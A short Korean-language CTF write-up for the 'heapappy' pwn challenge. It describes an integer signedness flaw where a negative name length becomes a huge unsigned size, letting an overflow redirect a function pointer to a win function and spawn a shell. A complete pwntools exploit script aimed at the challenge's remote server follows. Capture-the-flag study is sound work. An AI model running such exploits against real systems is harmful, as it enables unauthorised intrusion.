---
title: 'CCE - heapappy'
published: 2025-08-24
author: 'onLeaf'
description: 'heapappy writeup'
image: 'https://cdn.discordapp.com/avatars/1001487706267844608/04764b047c96ad414755cb889b85c36c.webp?size=80'
tags: ['Pwn','cce','sad']
category: 'PWN'
draft: false
---
#힙하다.

파일을 분석해보면 5가지의 큰 함수가 있다. 

그중 adopt 함수 내부를 보면 입력할 길이를 받고 input 함수를 호출하는 코드가 있다. 
근데 입력할 길이가 올바른지 판단하는 조건에서 입력이 24보다 크면 너무 길다고 출력하는 코드가 있지만 음수를 입력받았을때는 판단하지 않고 그냥 input으로 보내버린다. l
이 점이 의심스러워 input을 뜯어보니 전에 길이를 입력받을때엔 int로 선언되어있던 v1이 input함수로 넘어가면서 unsigned_int로 바뀌었다. 
이 점을 이용해 -99999같은 값을 입력할 길이에 넣어버리면 unsigned_int에 의해 매우 큰 값으로 바뀌고 여기에 win 함수의 주소를 넣어 ret을 덮고

포인터를 사용하는 perform_ritual 함수를 호출하면 
쉘을 딸 수 있다.


```python
from pwn import *

#p = process('./prob')
p = remote('3.38.164.12', 3030)
e = ELF('./prob')

win = e.symbols['win']

p.sendlineafter('Choice: ',b'1')

p.sendlineafter('Name length: ',b'-99999')

p.sendlineafter('Name bytes: ',b'A'*32 + p64(win))

p.sendlineafter('Choice: ',b'3')

p.interactive()
```
